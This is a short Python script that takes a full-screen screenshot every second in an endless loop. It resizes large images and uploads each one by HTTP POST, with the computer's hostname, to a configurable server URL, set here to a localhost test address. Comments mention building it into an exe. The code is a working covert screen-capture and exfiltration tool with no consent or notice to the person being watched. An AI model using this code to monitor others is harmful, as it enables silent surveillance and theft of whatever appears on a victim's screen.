import requests
import pyautogui
from PIL import Image
import sys
import os
import time
import platform


global fullPath,mypath

# when your want's things from exe file 
if getattr(sys, 'frozen', False):  
    fullPath = os.path.abspath(sys.executable)
    mypath = os.path.dirname(fullPath)
else:
    # if user want this things when code not in exe 
    fullPath = os.path.abspath(__file__)
    mypath = os.path.dirname(fullPath)

uplaodImageUrl = "http://localhost/testing/"
image_path = mypath+"/screenshot.png"
computer_name = platform.node()


def click_screenshot(path):
    # Capture the screenshot
    screenshot = pyautogui.screenshot()

    # Save the screenshot to the specified path
    screenshot.save(path)

    # Check the file size
    file_size_mb = os.path.getsize(path) / (1024 * 1024)  # Convert bytes to megabytes

    # If the file size is greater than 2 MB, resize the image
    if file_size_mb > 1:
        # Calculate the new width and height to reduce the file size
        width, height = screenshot.size
        new_width = int(width * 0.8)  # Adjust the scale factor as needed
        new_height = int(height * 0.8)

        # Resize the image
        resized_screenshot = screenshot.resize((new_width, new_height), Image.ANTIALIAS)
        
        # Save the resized image
        resized_screenshot.save(path)

        # Update the file size
        file_size_mb = os.path.getsize(path) / (1024 * 1024)

    return path
    

def uplaod_image_on_server(url,image_path):
    # Open the image file in binary mode
    with open(image_path, "rb") as file:
        # Create a dictionary with the file parameter and the image file
        files = {"screenshot": (image_path, file, "image/jpeg")}

        # post data 
        payload = {
        "SystemName": computer_name,
        }

        # Make the POST request with the image
        response = requests.post(url, files=files,data=payload)

    # Print the response
    print(response.text)


def screenshot_server_upload():
    global image_path
    image_path = click_screenshot(image_path)
    if(image_path):
        uplaod_image_on_server(uplaodImageUrl,image_path)
        print("Image Uploaded....")


while True:
    screenshot_server_upload()
    time.sleep(1)

